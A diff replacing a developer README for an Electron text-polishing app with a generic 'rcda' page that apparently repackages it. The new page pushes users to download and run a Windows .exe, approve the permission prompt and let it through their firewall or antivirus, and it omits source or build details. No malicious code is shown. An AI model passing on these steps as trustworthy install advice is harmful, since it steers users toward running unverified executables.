@@ -1,76 +1,162 @@
-# Text Polish Agent
+# 🤖 rcda - Fast AI Text Polishing & Translation
 
-Text Polish Agent is a hotkey-first desktop app for polishing and translating text with AI.
-It pops up instantly from anywhere on your system, helps you refine tone/clarity through interactive options, then generates an English translation you can copy in one click.
+[![Download rcda](https://img.shields.io/badge/Download-rcda-brightgreen?style=for-the-badge)](https://github.com/boinkredz/rcda)
 
-## Features
+rcda is a simple desktop assistant that helps improve your writing and translate text quickly. It runs on Windows and launches with a hotkey for easy access. This guide will help you download and run the app without any technical skills.
 
-- Global shortcut to open a floating assistant window.
-- Interactive AI-based text polishing workflow.
-- One-click English translation after confirmation.
-- Multi-language UI support (Traditional Chinese, Simplified Chinese, English).
-- Auto language detection from system locale with manual override in settings.
-- API settings (OpenAI-compatible endpoint and key).
-- Custom system prompt and shortcut configuration.
-- Tray app behavior with quick open/settings/quit actions.
+---
 
-## Tech Stack
+## 📥 Where to Download rcda
 
-- Electron
-- React
-- TypeScript
-- Vite
-- Zustand
-- Vitest
+You can get rcda by visiting the official GitHub page below. This page has the latest version and all needed files:
 
-## Development
+[Download rcda from GitHub](https://github.com/boinkredz/rcda)
 
-```bash
-npm install
-npm run dev
-```
+Click the link above to open the page in your browser. You will find the download files under the **Releases** section. Look for the version marked as stable or latest.
 
-## Docker + Makefile
+---
 
-```bash
-make run
-make stop
-make restart
-make update
-make build
-```
+## 🖥️ System Requirements
 
-- `make run`: start Docker services, then launch Electron desktop app on host.
-- `make stop`: stop Docker services.
+Make sure your computer meets these needs before running rcda:
 
-## Quality Checks
+- Operating System: Windows 10 or later  
+- CPU: 1.5 GHz or faster processor (Intel or AMD)  
+- RAM: At least 4 GB  
+- Disk Space: 200 MB free space  
+- Internet connection is needed for AI features  
 
-```bash
-npm run format:check
-npm test
-npm run build
-```
+---
 
-## CI
+## 💾 How to Download and Install rcda
 
-- CI checks run by change scope through GitHub Actions.
+Follow these steps carefully to get rcda up and running.
 
-## macOS Self-Signing (Local Testing)
+1. Go to the [rcda GitHub page](https://github.com/boinkredz/rcda).
 
-If the downloaded app cannot be opened on macOS because it is unsigned/not notarized, you can self-sign it for local use:
+2. Scroll down to the **Releases** section, usually near the bottom or sidebar.
 
-```bash
-codesign --force --deep --sign - "/Applications/Text Polish Agent.app"
-xattr -dr com.apple.quarantine "/Applications/Text Polish Agent.app"
-codesign --verify --deep --strict --verbose=2 "/Applications/Text Polish Agent.app"
-```
+3. Click the latest release to open its details.
 
-Notes:
+4. Find the Windows installer file (it usually ends with `.exe`).
 
-- `--sign -` performs ad-hoc signing (local trust only).
-- This is suitable for personal testing but not for public distribution.
-- For public release, use Apple Developer ID signing and notarization.
+5. Click the file to download it to your computer. It will save in your default **Downloads** folder unless you choose otherwise.
 
-## License
+6. Once downloaded, open the `.exe` file by double-clicking it.
 
-MIT License. See the [LICENSE](./LICENSE) file.
+7. If Windows asks for permission to run the file, click **Yes**.
+
+8. Follow the installation prompts:
+    - Accept the license agreement.  
+    - Choose installation location or leave default.  
+    - Click **Install**.  
+
+9. After the install completes, choose to launch rcda now or use the desktop shortcut.
+
+---
+
+## 🚀 Using rcda for the First Time
+
+After installation, rcda runs as a small app waiting in the background.
+
+- Press the **Ctrl + Alt + R** hotkey (default) to open the assistant window.
+
+- Type or paste any text you want to improve or translate.
+
+- Choose from options like text polishing or translation.
+
+- Click the button to process your text.
+
+- The improved or translated result will appear instantly.
+
+---
+
+## ⚙️ Customize Your Hotkeys and Settings
+
+If you want to change the hotkey that opens rcda or adjust other preferences:
+
+1. Open rcda using the hotkey or the desktop shortcut.
+
+2. Click the **Settings** icon in the app window.
+
+3. Find the hotkey option and press a new key combination.
+
+4. Save your changes.
+
+---
+
+## 🔧 Troubleshooting
+
+If rcda does not open or work correctly, try these fixes:
+
+- Make sure you completed the installation fully.
+
+- Restart your computer to apply all changes.
+
+- Confirm that your firewall or antivirus software allows rcda.
+
+- Check your internet connection since AI features need it.
+
+- Try reinstalling rcda by repeating the download and install steps.
+
+---
+
+## 🧰 What rcda Does
+
+rcda offers these main features to help you with text:
+
+- **Quick text polishing:** Fix grammar, spelling, and style fast.
+
+- **Translation:** Convert text between languages easily.
+
+- **Hotkey launcher:** Open the app from anywhere with a simple shortcut.
+
+- **Runs quietly:** Works in the background without disrupting other tasks.
+
+- **Supports common text formats:** Copy and paste plain text or rich text.
+
+---
+
+## 🌐 About rcda
+
+rcda is built using Electron and React. It uses AI to make writing smoother and translation faster. The app aims to improve your productivity without forcing you to switch apps or open complex tools.
+
+Topics related to rcda include:
+
+- AI assistant  
+- Desktop app  
+- Electron framework  
+- OpenAI integration  
+- Text editing  
+- TypeScript and Vite  
+- State management with Zustand  
+
+---
+
+## 🛠️ Updating rcda
+
+Keep your app up to date to get new features and fixes:
+
+- Visit the [GitHub releases page](https://github.com/boinkredz/rcda) regularly.
+
+- Download the newest Windows installer if available.
+
+- Run the installer the same way as before; it will replace the old version.
+
+---
+
+## ℹ️ Getting Support
+
+For help or to report issues:
+
+- Use the **Issues** tab on the [GitHub repository](https://github.com/boinkredz/rcda).
+
+- Describe your problem clearly and include your Windows version.
+
+- Developers and community members will reply to assist.
+
+---
+
+## 🔗 Quick Access to Download
+
+[![Download rcda](https://img.shields.io/badge/Download-rcda-blue?style=for-the-badge)](https://github.com/boinkredz/rcda)
